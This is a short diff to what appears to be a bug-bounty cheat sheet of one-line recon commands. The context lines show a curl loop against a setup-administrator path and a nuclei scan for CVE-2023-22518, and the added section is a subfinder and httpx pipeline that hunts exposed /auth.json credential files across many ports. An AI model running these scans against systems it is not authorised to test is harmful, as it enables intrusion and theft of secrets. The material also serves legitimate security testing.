@@ -282,3 +282,12 @@ cat file.txt | while read host do; do curl -skL "http://$host/setup/setupadminis
 ```
 subfinder -d TARGET.COM -silent | httpx -silent | nuclei -t CVE-2023-22518.yaml
 ```
+
+────────────────────────────────────────────────────────────────────────
+
+# Extract Sensitive Informations on /auth.json Endpoint.
+
+## OneLiner
+```
+subfinder -d TARGET.COM | httpx -path "/auth.json" -title -status-code -content-length -t 80 -p 80,443,8080,8443,9000,9001,9002,9003
+```
